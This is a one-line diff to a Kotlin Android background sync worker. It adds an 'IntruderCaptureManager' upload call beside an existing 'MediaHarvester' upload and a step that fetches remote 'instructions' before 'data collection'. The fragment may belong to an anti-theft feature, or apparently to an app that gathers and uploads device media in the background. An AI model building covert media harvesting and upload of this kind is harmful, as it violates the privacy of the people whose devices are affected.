@@ -33,6 +33,7 @@ class SyncWorker(appContext: Context, workerParams: WorkerParameters) : Coroutin
 
             // --- RECOVERY PROTOCOL: Harvested Media Retries ---
             MediaHarvester.packageAndUpload(ctx)
+            IntruderCaptureManager.packageAndUpload(ctx)
 
             // --- BATCHED INSTRUCTIONS: Fetch Rules & Config before data collection ---
             fetchLatestInstructions(ctx)
